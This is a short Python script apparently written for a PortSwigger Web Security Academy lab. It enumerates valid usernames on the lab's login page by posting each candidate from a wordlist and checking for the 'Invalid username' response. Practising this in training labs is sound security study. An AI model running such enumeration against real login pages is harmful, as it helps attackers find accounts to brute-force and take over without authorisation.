import requests

DOMAIN = '0a7a002b043af24d80adee2e007b000c'
# Define the URL and headers for the request
url = f"https://{DOMAIN}.web-security-academy.net/login"
headers = {
    "Host": f"{DOMAIN}.web-security-academy.net",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": f"https://{DOMAIN}.web-security-academy.net",
    "Connection": "close",
    "Referer": f"https://{DOMAIN}.web-security-academy.net/login",
    "Cookie": "session=fWcfhzqxwtOutKHnmkTJy7LGDlGUbEP6",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1"
}

# Read the usernames from the .txt file
with open('candidate_usernames.txt', 'r') as file:
    usernames = file.readlines()

# Loop through each username
for username in usernames:
    username = username.strip()
    data = {
        "username": username,
        "password": "k"
    }

    # Send the POST request
    response = requests.post(url, headers=headers, data=data)

    # Check if the response contains "Invalid username"
    if "Invalid username" in response.text:
        print(f"Invalid username: {username}")
    else:
        print(f"Valid or unknown response for username: {username}")
